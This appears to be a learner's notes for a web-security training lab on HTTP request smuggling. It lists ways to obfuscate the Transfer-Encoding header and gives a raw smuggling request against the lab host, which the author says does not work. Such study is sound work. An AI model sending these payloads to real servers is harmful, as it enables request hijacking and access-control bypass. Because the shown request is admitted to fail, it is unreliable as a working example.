Title: HTTP request smuggling, obfuscating the TE header
Level: PRACTITIONER
Desc:  This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.
To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST. 


# Possible ways of Transfer-Encoding obfuscation: 
```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

# Walkthrough:

It should work, but it is not working:
```
POST / HTTP/1.1
Host: 0ac5006e04aee75c8003eec0002d006f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```


